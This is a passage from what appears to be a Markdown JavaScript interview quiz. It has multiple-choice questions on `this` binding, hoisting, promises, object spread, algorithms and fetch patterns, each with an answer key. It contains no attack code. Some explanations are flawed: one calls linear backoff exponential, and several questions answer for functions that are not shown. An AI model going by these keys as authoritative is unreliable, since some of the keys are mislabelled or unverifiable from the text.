**Answer: C) `I'm John, 25 yrs old`**

**Explanation:** The arrow function inside `getProfile()` does not have its own `this`. It lexically inherits `this` from the enclosing `getProfile` method, which was called on `user`. Therefore `this.name` is `'John'` and `this.age` is `25`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A `User` constructor returns a regular (non-arrow) inner function. What does `profile()` log in a browser?

```javascript
function User(name, age) {
  this.name = name;
  this.age = age;
  this.getProfile = function () {
    return function () {
      console.log("I'm " + this.name + ", " + this.age + " yrs old");
    };
  };
}

var user = new User('John', 25);
var profile = user.getProfile();
profile();
```

- A) `I'm John, 25 yrs old`
- B) `I'm undefined, undefined yrs old`
- C) `TypeError: Cannot read property 'name' of undefined`
- D) `I'm , undefined yrs old`

**Answer: D) `I'm , undefined yrs old`**

**Explanation:** When `profile()` is called as a plain function (not as a method), `this` refers to the global object (`window` in browsers). `window.name` defaults to `''` (empty string) and `window.age` is `undefined`. Arrow functions solve this; alternatively, use `.bind(this)` or store `const self = this`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A named function expression is used inside an `if` condition. What does this code log?

```javascript
var y = 1;
if (function f() {}) {
  y += typeof f;
}
console.log(y);
```

- A) `2`
- B) `"1function"`
- C) `"1undefined"`
- D) `ReferenceError: f is not defined`

**Answer: C) `"1undefined"`**

**Explanation:** The named function expression `function f(){}` is truthy, so the `if` block runs. However, the name `f` is only accessible inside the function expression\'s own body — it is not in scope inside the `if` block. `typeof f` returns `"undefined"` (not a `ReferenceError`, since `typeof` is safe for undeclared names). `1 + "undefined"` coerces to `"1undefined"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer calls `new Vehicle(...)` before the function declaration. What is the output?

```javascript
var car = new Vehicle("Honda", "white", "2010", "UK");
console.log(car);

function Vehicle(model, color, year, country) {
  this.model = model;
  this.color = color;
  this.year = year;
  this.country = country;
}
```

- A) `ReferenceError: Vehicle is not defined`
- B) `undefined`
- C) `Vehicle { model: 'Honda', color: 'white', year: '2010', country: 'UK' }`
- D) `TypeError: Vehicle is not a constructor`

**Answer: C) `Vehicle { model: 'Honda', color: 'white', year: '2010', country: 'UK' }`**

**Explanation:** Function declarations are fully hoisted, meaning both the name and the implementation are available throughout the entire scope before execution. `new Vehicle(...)` works even before the declaration line because the engine hoists the entire `Vehicle` function to the top.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A constructor function is called without the `new` keyword. What does `console.log(car)` output?

```javascript
function Vehicle(model, color, year, country) {
  this.model = model;
  this.color = color;
  this.year = year;
  this.country = country;
}

var car = Vehicle("Honda", "white", "2010", "UK");
console.log(car);
```

- A) `Vehicle { model: 'Honda', color: 'white', year: '2010', country: 'UK' }`
- B) `{}`
- C) `undefined`
- D) `TypeError: Vehicle is not a constructor`

**Answer: C) `undefined`**

**Explanation:** Without `new`, `Vehicle` is called as a plain function. `this` refers to the global object, so the properties are set on `window`/`global`. The function has no explicit `return` statement, so it returns `undefined`, which is assigned to `car`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses ES6 object property shorthand. Which statement about the output is correct?

```javascript
const name = 'Alice';
const age = 30;

const user1 = { name: name, age: age };
const user2 = { name, age };

console.log(user1.name === user2.name);
```

- A) `false` — `user2` creates new values
- B) `true` — both syntaxes produce equivalent objects
- C) `SyntaxError` — shorthand is not valid inside objects
- D) `undefined` — shorthand only works in destructuring

**Answer: B) `true` — both syntaxes produce equivalent objects**

**Explanation:** ES6 property shorthand `{ name, age }` is syntactic sugar for `{ name: name, age: age }`. Both objects have identical property values, so `user1.name === user2.name` is `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `Promise.all()` with a mix of resolving and rejecting promises. What is logged?

```javascript
const p1 = Promise.resolve(3);
const p2 = new Promise(resolve => setTimeout(() => resolve('foo'), 100));
const p3 = Promise.reject('Error occurred');
const p4 = Promise.resolve(42);

Promise.all([p1, p2, p3, p4])
  .then(values => console.log(values))
  .catch(error => console.log('Caught:', error));
```

- A) `[3, 'foo', 'Error occurred', 42]`
- B) `[3, 'foo', null, 42]`
- C) `Caught: Error occurred`
- D) The `.then()` runs and logs `[3, undefined, undefined, 42]`

**Answer: C) `Caught: Error occurred`**

**Explanation:** `Promise.all()` short-circuits on the first rejection. As soon as `p3` rejects with `'Error occurred'`, the whole `Promise.all()` rejects immediately, regardless of the other pending promises. The `.catch()` handler receives the rejection reason.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer sets up prototypal inheritance between `Animal` and `Dog`. What does the code log?

```javascript
function Animal(name) {
  this.name = name;
}
Animal.prototype.speak = function () {
  console.log(this.name + ' makes a sound.');
};

function Dog(name) {
  Animal.call(this, name);
}
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;
Dog.prototype.speak = function () {
  console.log(this.name + ' barks.');
};

const dog = new Dog('Rex');
dog.speak();
console.log(dog instanceof Dog);
console.log(dog instanceof Animal);
```

- A) `Rex makes a sound.`, `true`, `false`
- B) `Rex barks.`, `true`, `true`
- C) `Rex barks.`, `false`, `true`
- D) `TypeError: dog.speak is not a function`

**Answer: B) `Rex barks.`, `true`, `true`**

**Explanation:** `Dog.prototype` overrides `speak`, so `dog.speak()` logs `'Rex barks.'`. `Object.create(Animal.prototype)` links the prototype chain, making `dog instanceof Animal` return `true`. `Dog.prototype.constructor = Dog` correctly restores the constructor reference.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A function has a `return` statement on its own line followed by an object literal. What does it return?

```javascript
function foo() {
  return
  {
    message: "Hello World"
  };
}
console.log(foo());
```

- A) `{ message: "Hello World" }`
- B) `null`
- C) `undefined`
- D) `SyntaxError: Unexpected token`

**Answer: C) `undefined`**

**Explanation:** JavaScript\'s Automatic Semicolon Insertion (ASI) inserts a semicolon after the `return` keyword because a line break follows. The function effectively returns `undefined`, and the object literal becomes unreachable dead code. To fix this, place the opening brace on the same line as `return`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses the spread operator to merge two objects with overlapping keys. What does `obj3` contain?

```javascript
const obj1 = { a: 1, b: 2 };
const obj2 = { b: 3, c: 4 };
const obj3 = { ...obj1, ...obj2 };

console.log(obj3);
```

- A) `{ a: 1, b: 2, c: 4 }`
- B) `{ a: 1, b: 3, c: 4 }`
- C) `{ a: 1, b: [2, 3], c: 4 }`
- D) `TypeError: cannot spread object with duplicate keys`

**Answer: B) `{ a: 1, b: 3, c: 4 }`**

**Explanation:** When spreading multiple objects, later properties overwrite earlier ones with the same key. `obj2.b` (value `3`) overwrites `obj1.b` (value `2`). Spread creates a shallow merge — properties from `obj2` take precedence.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer spreads an object containing a nested object. What does `original.y.z` log after modifying the copy?

```javascript
const original = { x: 1, y: { z: 2 } };
const copy = { ...original };

copy.x = 10;
copy.y.z = 20;

console.log(original.x);
console.log(original.y.z);
```

- A) `1`, `2`
- B) `10`, `20`
- C) `1`, `20`
- D) `10`, `2`

**Answer: C) `1`, `20`**

**Explanation:** The spread operator creates a **shallow copy**. Primitive values (`x`) are copied by value, so `copy.x = 10` does not affect `original.x`. Nested objects (`y`) are copied by reference, so `copy.y` and `original.y` point to the same object — mutating `copy.y.z` also changes `original.y.z`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer accesses a `let` variable before its declaration. What happens?

```javascript
console.log(varVariable);
console.log(letVariable);

var varVariable = 'I am var';
let letVariable = 'I am let';
```

- A) Both log `undefined`
- B) `undefined`, then `ReferenceError: Cannot access 'letVariable' before initialization`
- C) Both throw `ReferenceError`
- D) `undefined`, then `null`

**Answer: B) `undefined`, then `ReferenceError: Cannot access 'letVariable' before initialization`**

**Explanation:** `var` is hoisted and initialized to `undefined`, so the first log succeeds. `let` is hoisted but not initialized — it sits in the **Temporal Dead Zone (TDZ)** from the start of the block until the declaration line. Accessing it before declaration throws a `ReferenceError`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer compares values using `==` and `===`. Which pair of statements is correct?

```javascript
console.log([] == false);   // ?
console.log([] === false);  // ?
console.log(null == undefined);  // ?
console.log(null === undefined); // ?
```

- A) `true`, `false`, `true`, `false`
- B) `false`, `false`, `true`, `true`
- C) `true`, `true`, `false`, `false`
- D) `false`, `true`, `false`, `true`

**Answer: A) `true`, `false`, `true`, `false`**

**Explanation:** `[] == false`: `[]` coerces to `''`, `false` coerces to `0`, `''` coerces to `0` — `0 == 0` is `true`. `[] === false`: different types, so `false`. `null == undefined` is a special case defined as `true` in the spec. `null === undefined`: different types, so `false`. Always prefer `===` to avoid unexpected coercion.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `reduce` to generate all subsets of a given set. What does this function return for input `[1, 2, 3]`?

```javascript
const getAllSubset = arr =>
  arr.reduce(
    (subsets, value) => subsets.concat(subsets.map(set => [value, ...set])),
    [[]]
  );

console.log(getAllSubset([1, 2, 3]));
```

- A) `[[1], [2], [3], [1,2], [1,3], [2,3], [1,2,3]]`
- B) `[[], [1], [2], [2,1], [3], [3,1], [3,2], [3,2,1]]`
- C) `[[1,2,3], [1,2], [1,3], [2,3], [1], [2], [3], []]`
- D) `[[], [1], [2], [3], [1,2], [1,3], [2,3], [1,2,3]]`

**Answer: B) `[[], [1], [2], [2,1], [3], [3,1], [3,2], [3,2,1]]`**

**Explanation:** The accumulator starts as `[[]]`. For each `value`, the existing subsets are mapped to prepend `value`, and the results are concatenated onto the current subsets. After `1`: `[[], [1]]`. After `2`: `[[], [1], [2], [2,1]]`. After `3`: `[[], [1], [2], [2,1], [3], [3,1], [3,2], [3,2,1]]` — 2³ = 8 subsets total.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer filters an array of items using a list of exclusion rules. Which items remain in `newItems`?

```javascript
let items = [
  { color: 'red',    type: 'tv',    age: 18 },
  { color: 'silver', type: 'phone', age: 20 },
  { color: 'blue',   type: 'phone', age: 20 },
  { color: 'green',  type: 'phone', age: 20 }
];

let excludes = [
  { k: 'color', v: 'silver' },
  { k: 'type',  v: 'tv' },
];

let newItems = items.reduce((acc, item) => {
  let result = excludes.some(exclude => item[exclude['k']] === exclude['v']);
  if (!result) acc.push(item);
  return acc;
}, []);
```

- A) `red/tv` and `silver/phone` are removed; `blue/phone` and `green/phone` remain
- B) Only `silver/phone` is removed; the rest remain
- C) Only `red/tv` is removed; the rest remain
- D) All items are removed because every item matches at least one rule

**Answer: A) `red/tv` and `silver/phone` are removed; `blue/phone` and `green/phone` remain**

**Explanation:** `excludes.some()` checks if any rule matches the item. `red/tv` matches `{k:'type', v:'tv'}` and `silver/phone` matches `{k:'color', v:'silver'}` — both are excluded. `blue/phone` and `green/phone` match no rules and are kept.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer flattens a nested object using recursive `reduce`. What are the keys in the output?

```javascript
let obj = {
  "a": {
    "b": {
      "c": 12,
      "d": "Hello World",
      "e": null
    },
    "f": [1, 2, 3]
  }
};
console.log(flatten(obj));
```

- A) `{ a: {...}, b: {...} }` — only top-level keys
- B) `{ "b/c": 12, "b/d": "Hello World", "b/e": null, "f": [1,2,3] }`
- C) `{ "a/b/c": 12, "a/b/d": "Hello World", "a/b/e": null, "a/f": [1,2,3] }`
- D) `{ "a.b.c": 12, "a.b.d": "Hello World", "a.b.e": null, "a.f": [1,2,3] }`

**Answer: C) `{ "a/b/c": 12, "a/b/d": "Hello World", "a/b/e": null, "a/f": [1,2,3] }`**

**Explanation:** The `flatten` function recurses into nested plain objects, building up path keys with `/` separators. Arrays are not recursed (they are treated as leaf values), so `"a/f"` holds the entire `[1,2,3]` array. `null` is also treated as a leaf because `val != null` catches it.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements an undirected graph. After the operations below, what does `g.relations()` return?

```javascript
const g = new Graph();
g.addVertex(1); g.addVertex(2); g.addVertex(3);
g.addEdge(1, 2);
g.addEdge(1, 3);
g.addEdge(2, 3);
g.removeEdge(1, 3);
console.log(g.relations());
```

- A) `3`
- B) `2`
- C) `1`
- D) `0`

**Answer: B) `2`**

**Explanation:** Three `addEdge` calls set `numberOfEdges` to `3`. `removeEdge(1, 3)` finds and splices both directions from the adjacency list and decrements `numberOfEdges` once (only when `~index1` is true). Result: `3 - 1 = 2`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses a sliding-window approach to find the longest substring without repeating characters. What does this function return for `"abcabcbb"`?

```javascript
const lengthOfLongestSubstring = function(s) {
  let map = {}, start = 0, maxLen = 0;
  let arr = s.split('');
  for (let i = 0; i < s.length; i++) {
    let current = map[arr[i]];
    if (current != null && start <= current) {
      start = current + 1;
    } else {
      maxLen = Math.max(maxLen, i - start + 1);
    }
    map[arr[i]] = i;
  }
  return maxLen;
};

console.log(lengthOfLongestSubstring("abcabcbb"));
```

- A) `2`
- B) `7`
- C) `3`
- D) `4`

**Answer: C) `3`**

**Explanation:** The longest substring without repeating characters in `"abcabcbb"` is `"abc"` (length 3). The algorithm uses a hash map to store the last-seen index of each character and moves the `start` pointer forward whenever a duplicate is found within the current window.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer runs Kadane\'s algorithm using `reduce` to find the maximum subarray sum. What does this return?

```javascript
const maxSubArray = (nums) => {
  let currentSum = 0;
  return nums.reduce((acc, item) => {
    currentSum = Math.max(currentSum + item, 0);
    return Math.max(acc, currentSum);
  }, 0);
};

console.log(maxSubArray([-2, 1, -3, 4, -1, 2, 1, -5, 4]));
```

- A) `4`
- B) `7`
- C) `6`
- D) `10`

**Answer: C) `6`**

**Explanation:** The algorithm tracks `currentSum` — if adding the next element would make it negative, it resets to `0`. The subarray `[4, -1, 2, 1]` gives the maximum sum of `6`. `acc` always holds the best sum seen so far. Note: this variant returns `0` for all-negative arrays (it never goes below `0`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer computes the median of an array. The `mid` index is calculated as `Math.floor((0, sortedArr.length - 1) / 2)`. What does the comma operator `(0, sortedArr.length - 1)` evaluate to?

```javascript
let mid = Math.floor((0, sortedArr.length - 1) / 2);
```

For `sortedArr = [1, 3, 5, 7, 8, 9, 9, 21]` (length 8), what is `mid`?

- A) `0` — the comma operator always returns the leftmost value
- B) `3` — evaluates to `(sortedArr.length - 1) / 2 = 7 / 2 = 3`
- C) `4` — evaluates to `sortedArr.length / 2 = 8 / 2 = 4`
- D) `SyntaxError` — comma inside `Math.floor()` is invalid

**Answer: B) `3` — evaluates to `(sortedArr.length - 1) / 2 = 7 / 2 = 3`**

**Explanation:** The comma operator evaluates each operand left-to-right and returns the **rightmost** value. `(0, sortedArr.length - 1)` returns `sortedArr.length - 1 = 7`. So `mid = Math.floor(7 / 2) = 3`. This is likely an unintentional use of the comma operator — the developer probably meant `Math.floor((sortedArr.length - 1) / 2)`, which coincidentally produces the same result here.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer merges overlapping intervals. What does this function return for `[[1,3],[2,6],[8,10],[15,18]]`?

```javascript
console.log(mergeIntervals([[1,3],[2,6],[8,10],[15,18]]));
```

- A) `[[1,3],[2,6],[8,10],[15,18]]` — no changes
- B) `[[1,6],[8,10],[15,18]]`
- C) `[[1,6],[8,18]]`
- D) `[[1,10],[15,18]]`

**Answer: B) `[[1,6],[8,10],[15,18]]`**

**Explanation:** After sorting by start, the reduce processes each interval. `[1,3]` and `[2,6]` overlap (`3 > 2`), so they merge to `[1,6]`. `[8,10]` does not overlap with `[1,6]`, so it is kept separately. `[15,18]` does not overlap with `[8,10]`, so it is kept. Result: `[[1,6],[8,10],[15,18]]`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Two rectangles are created and tested for overlap. What do the two `console.log` calls output?

```javascript
const rect1 = new Rectangle(250, 250, 150, 100); // x,y,width,height
const rect2 = new Rectangle(100, 100, 300, 200);
const rect3 = new Rectangle(450, 450, 150, 100);

console.log(rect1.isOverlapping(rect2)); // ?
console.log(rect2.isOverlapping(rect3)); // ?
```

- A) `true`, `true`
- B) `false`, `false`
- C) `true`, `false`
- D) `false`, `true`

**Answer: C) `true`, `false`**

**Explanation:** `rect1` spans x:[250,400], y:[250,350]. `rect2` spans x:[100,400], y:[100,300]. They share y overlap (250 < 300) and x overlap, so `true`. `rect3` spans x:[450,600], y:[450,550]. `rect2`\'s right edge is `x=400`, which is less than `rect3.x=450` — the condition `rect2.x + rect2.width > rect3.x` → `400 > 450` is `false`, so no overlap.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer finds the second largest number in an array using a single pass. What does this return?

```javascript
const secondLargest = (arr) => {
  let largest = -1, secondLargest = -1;
  arr.forEach(el => {
    if (el > largest) {
      let temp = largest;
      largest = el;
      secondLargest = temp;
    } else if (el > secondLargest) {
      secondLargest = el;
    }
  });
  return secondLargest;
};

console.log(secondLargest([1, 10, 2, 9]));
```

- A) `10`
- B) `2`
- C) `9`
- D) `-1`

**Answer: C) `9`**

**Explanation:** Iterating: `el=1` → largest=1, second=-1. `el=10` → largest=10, second=1. `el=2` → 2 > second(1), so second=2. `el=9` → 9 > second(2), so second=9. Final: `9`. Note: this implementation has a limitation — it initialises both sentinels to `-1`, so it fails for all-negative arrays.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer spots a syntax error in this sequential promise execution snippet. What is wrong?

```javascript
return tasks.reduce((promiseChain, currentTask) => {
  return promiseChain.then(chain =>
    currentTask.then(result => [...chain, result]);
  );
}, Promise.resolve([]));
```

- A) `Promise.resolve([])` should be `Promise.resolve()`
- B) A stray semicolon (`;`) after `[...chain, result])` prematurely terminates the arrow function expression before the outer `)` closes
- C) `[...chain, result]` is invalid — you cannot spread inside an array literal inside `.then()`
- D) `reduce` cannot be used with promises — use `Promise.all()` instead

**Answer: B) A stray semicolon (`;`) after `[...chain, result])` prematurely terminates the arrow function expression before the outer `)` closes**

**Explanation:** The inner `.then(result => [...chain, result])` is correct, but the `;` immediately after it ends the `promiseChain.then(chain => ...)` callback before its closing `)` — making it a syntax error. The fix is to remove that semicolon so the return value of `currentTask.then(...)` properly flows back as the resolved value.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer converts a sorted array to a height-balanced BST. What is the root node\'s value for input `[1,2,3,4,5,6,7]`?

```javascript
const sortedArrayToBST = (nums) => {
  let rec = (nums, start, end) => {
    if (start > end) return null;
    let mid = Math.floor((start + end) / 2);
    let root = new Node(nums[mid]);
    root.left  = rec(nums, start, mid - 1);
    root.right = rec(nums, mid + 1, end);
    return root;
  };
  return rec(nums, 0, nums.length - 1);
};

console.log(sortedArrayToBST([1, 2, 3, 4, 5, 6, 7]));
```

- A) `1`
- B) `3`
- C) `4`
- D) `7`

**Answer: C) `4`**

**Explanation:** The first call has `start=0`, `end=6`. `mid = Math.floor(6/2) = 3`. `nums[3] = 4` becomes the root. This mid-point selection ensures the tree is height-balanced: left subtree holds `[1,2,3]` and right subtree holds `[5,6,7]`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer generates all permutations of the string `"abcd"` using recursion. How many permutations does the function return?

```javascript
const strPermutations = str => {
  if (str.length < 2) return str;
  let permutations = [];
  for (let i = 0; i < str.length; i++) {
    let char = str[i];
    let remaining = str.slice(0, i) + str.slice(i + 1);
    for (let sub of strPermutations(remaining)) {
      permutations.push(char + sub);
    }
  }
  return permutations;
};

console.log(strPermutations("abcd").length);
```

- A) `8`
- B) `16`
- C) `24`
- D) `32`

**Answer: C) `24`**

**Explanation:** The number of permutations of `n` distinct characters is `n!`. For `"abcd"` (4 characters), that is `4! = 4 × 3 × 2 × 1 = 24`. The algorithm picks each character as the first element, then recursively permutes the remaining string, and concatenates all results.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer validates a word square by checking symmetry across the diagonal. What does `validWordSquare(arr1)` return?

```javascript
let arr1 = [
  ["a","b","c","d"],
  ["b","n","r","t"],
  ["c","r","m","y"],
  ["d","t","y","e"]
];

console.log(validWordSquare(arr1));
```

- A) `false` — the grid has no repeated letters
- B) `true` — `words[i][j] === words[j][i]` holds for all positions
- C) `false` — the grid dimensions do not match
- D) `RangeError` — index out of bounds

**Answer: B) `true` — `words[i][j] === words[j][i]` holds for all positions**

**Explanation:** A valid word square requires that the grid is symmetric across its main diagonal (i.e., it reads the same horizontally and vertically). Checking every `(i,j)` pair: `words[0][1]='b'=words[1][0]`, `words[0][2]='c'=words[2][0]`, `words[1][2]='r'=words[2][1]`, `words[2][3]='y'=words[3][2]`, etc. — all pairs match, so the function returns `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `setInterval` to animate a DOM element, updating its `left` position each frame. When does the animation stop?

```javascript
var left = 0, lastFrame = +new Date, timer;
timer = setInterval(function() {
  var now = +new Date, deltaT = now - lastFrame;
  elem.style.left = (left += 10 * deltaT / 16) + "px";
  lastFrame = now;
  if (left > 400) {
    clearInterval(timer);
  }
}, 16);
```

- A) After exactly 400 frames
- B) When `left` exceeds `400` pixels
- C) After 400 milliseconds regardless of `left`
- D) Never — `clearInterval` inside `setInterval` has no effect

**Answer: B) When `left` exceeds `400` pixels**

**Explanation:** Each tick calculates the time elapsed since the last frame (`deltaT`) and advances `left` proportionally (`10 * deltaT / 16` pixels). When `left` exceeds `400`, `clearInterval(timer)` stops the interval. This delta-time technique makes the animation speed independent of frame timing jitter — unlike simply incrementing by a fixed number each tick.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the most robust way to implement retry logic for a fetch request?

```javascript
async function fetchWithRetry(url, maxRetries = 3, delay = 1000) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      const res = await fetch(url);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      return await res.json();
    } catch (e) {
      if (attempt === maxRetries) throw e;
      await new Promise(r => setTimeout(r, delay * attempt)); // exponential backoff
    }
  }
}
```

What does this pattern provide that a simple `try/catch` doesn\'t?

- A) Automatic retry with exponential backoff for transient failures
- B) Prevents all network errors from occurring
- C) Caches the response after the first successful fetch
- D) Implements circuit-breaker functionality

**Answer: A) Automatic retry with exponential backoff for transient failures**

**Explanation:** `fetchWithRetry` retries on any error up to `maxRetries`. Exponential backoff (`delay * attempt`) increases wait time between retries (1s, 2s, 3s...) to avoid overwhelming a struggling server. On the last attempt, the error is re-thrown. This handles transient failures (network blips, 503s) gracefully. In production, also add jitter (randomized delay) and a circuit breaker.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the Abort Controller pattern solve for fetch requests?

```javascript
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal })
  .then(r => r.json())
  .then(data => console.log(data))
  .catch(e => {
    if (e.name === 'AbortError') console.log('Request cancelled');
    else throw e;
  });

// Cancel after 5 seconds or on user navigation
setTimeout(() => controller.abort(), 5000);
```

- A) AbortController prevents all network errors
- B) AbortController allows cancelling in-flight fetch requests to prevent memory leaks and state updates on unmounted components
- C) AbortController retries failed requests automatically
- D) AbortController is only useful for large file uploads

**Answer: B) AbortController allows cancelling in-flight fetch requests to prevent memory leaks and state updates on unmounted components**

**Explanation:** Without cancellation, a fetch completes even if the user navigated away — updating state on an unmounted component (memory leak/warning). `AbortController` provides a `signal` passed to `fetch`. Calling `controller.abort()` rejects the promise with `AbortError`. In React, call `controller.abort()` in the `useEffect` cleanup function. This is the correct pattern for all production fetch operations.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the best approach to paginate a large API response?

```javascript
async function* fetchPages(baseUrl, pageSize = 50) {
  let page = 1;
  let hasMore = true;
  while (hasMore) {
    const data = await fetch(`${baseUrl}?page=${page}&limit=${pageSize}`)
      .then(r => r.json());
    yield data.items;
    hasMore = data.hasNextPage;
    page++;
  }
}

async function loadAll() {
  for await (const items of fetchPages('/api/users')) {
    processItems(items);
  }
}
```

What does the async generator provide here?

- A) It loads all pages simultaneously in parallel
- B) It provides a lazy, iterable stream of pages — processing each page as it arrives without loading all data into memory at once
- C) It caches all pages after the first fetch
- D) It runs `processItems` for all pages synchronously

**Answer: B) It provides a lazy, iterable stream of pages — processing each page as it arrives without loading all data into memory**

**Explanation:** `async function*` (async generator) yields values asynchronously. `for await...of` consumes them one at a time. Each iteration fetches the next page and processes it before fetching the next. This prevents loading an entire dataset into memory at once (critical for large datasets). The generator encapsulates the pagination logic cleanly, and consumers use a standard `for await` loop.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `structuredClone` improve upon JSON deep cloning?

```javascript
const original = {
  date: new Date(),
  map: new Map([['a', 1]]),
  set: new Set([1, 2, 3]),
  fn: () => 'lost',
  circular: null
};
original.circular = original; // circular reference

// JSON approach fails
try {
  JSON.parse(JSON.stringify(original));
} catch(e) { console.log('JSON failed:', e.constructor.name); }

// structuredClone works (without functions)
const cloned = structuredClone({ date: original.date, map: original.map, set: original.set });
console.log(cloned.date instanceof Date, cloned.map instanceof Map);
```

- A) `"JSON failed: TypeError"`, `false`, `false`
- B) `"JSON failed: TypeError"`, `true`, `true`
- C) Both work identically
- D) `"JSON failed: SyntaxError"`, `true`, `true`

**Answer: B) `"JSON failed: TypeError"`, `true`, `true`**

**Explanation:** `JSON.stringify` throws `TypeError` on circular references. `structuredClone` (ES2022) handles: circular references, `Date` (preserves type), `Map`, `Set`, `ArrayBuffer`, `RegExp`. It does NOT clone: functions, DOM nodes, or class instances (they're plain objects). `cloned.date instanceof Date` → `true` (unlike JSON which converts to string).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the best way to implement a rate limiter in a JavaScript application?

```javascript
function createRateLimiter(maxRequests, windowMs) {
  const requests = [];
  return function(fn) {
    const now = Date.now();
    // Remove requests outside the window
    while (requests.length && requests[0] < now - windowMs) {
      requests.shift();
    }
    if (requests.length >= maxRequests) {
      return Promise.reject(new Error('Rate limit exceeded'));
    }
    requests.push(now);
    return fn();
  };
}
```

- A) This pattern allows infinite requests within the window
- B) This implements a sliding window rate limiter — tracks request timestamps and rejects requests exceeding the limit within the time window
- C) This only limits POST requests
- D) This modifies the `fetch` API globally

**Answer: B) This implements a sliding window rate limiter — tracks timestamps and rejects requests exceeding the limit**

**Explanation:** The sliding window approach maintains a list of request timestamps. Old timestamps (outside `windowMs`) are removed. If remaining count ≥ `maxRequests`, the request is rejected. Otherwise, the timestamp is added and the function runs. This prevents bursts of requests. In production, also implement server-side rate limiting — client-side alone is bypassable.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How do you implement a publish-subscribe event bus in JavaScript?

```javascript
class EventBus {
  #subscribers = new Map();
  
  subscribe(event, handler) {
    if (!this.#subscribers.has(event)) this.#subscribers.set(event, new Set());
    this.#subscribers.get(event).add(handler);
    return () => this.#subscribers.get(event).delete(handler); // unsubscribe
  }
  
  publish(event, data) {
    this.#subscribers.get(event)?.forEach(handler => handler(data));
  }
}

const bus = new EventBus();
const unsub = bus.subscribe('userLogin', u => console.log(`Welcome, ${u.name}`));
bus.publish('userLogin', { name: 'Alice' });
unsub(); // clean up
bus.publish('userLogin', { name: 'Bob' }); // no handler
```

- A) `"Welcome, Alice"`, `"Welcome, Bob"`
- B) `"Welcome, Alice"` only — `unsub()` removes the handler
- C) Both fail with `TypeError`
- D) `"Welcome, Bob"` only

**Answer: B) `"Welcome, Alice"` only — `unsub()` removes the handler**

**Explanation:** `subscribe` returns a cleanup function that removes the handler from the `Set`. After `unsub()`, the handler is deleted. The second `publish` finds the event in the Map but the `Set` is empty — `forEach` runs 0 times. Using `Set` instead of `Array` prevents duplicate handlers and enables O(1) deletion. The cleanup pattern prevents memory leaks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the best approach for implementing infinite scroll?

```javascript
const observer = new IntersectionObserver(
  async ([entry]) => {
    if (entry.isIntersecting && !loading) {
      loading = true;
      const newItems = await loadNextPage();
      appendItems(newItems);
      loading = false;
    }
  },
  { rootMargin: '200px' } // trigger 200px before end of list
);

observer.observe(document.getElementById('load-trigger'));
```

- A) This pattern uses scroll events, which are performance-intensive
- B) `IntersectionObserver` with a sentinel element provides a performant infinite scroll without scroll event listeners
- C) `rootMargin` causes items to load 200ms in advance
- D) This pattern doesn\'t handle the case where all items are loaded

**Answer: B) `IntersectionObserver` with a sentinel element provides a performant infinite scroll without scroll event listeners**

**Explanation:** A sentinel element at the bottom of the list is observed. When it enters the viewport (plus 200px of lookahead margin via `rootMargin`), new items load. `loading` flag prevents duplicate requests. `IntersectionObserver` is far more performant than `scroll` event listeners. The `rootMargin: '200px'` preloads content slightly before the user reaches the end, preventing blank space.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should you handle optimistic UI updates?

```javascript
async function toggleLike(postId, currentState) {
  // Optimistic update: immediately flip UI
  setLiked(!currentState);
  setLikeCount(prev => currentState ? prev - 1 : prev + 1);
  
  try {
    await fetch(`/api/posts/${postId}/like`, { method: 'POST' });
  } catch (e) {
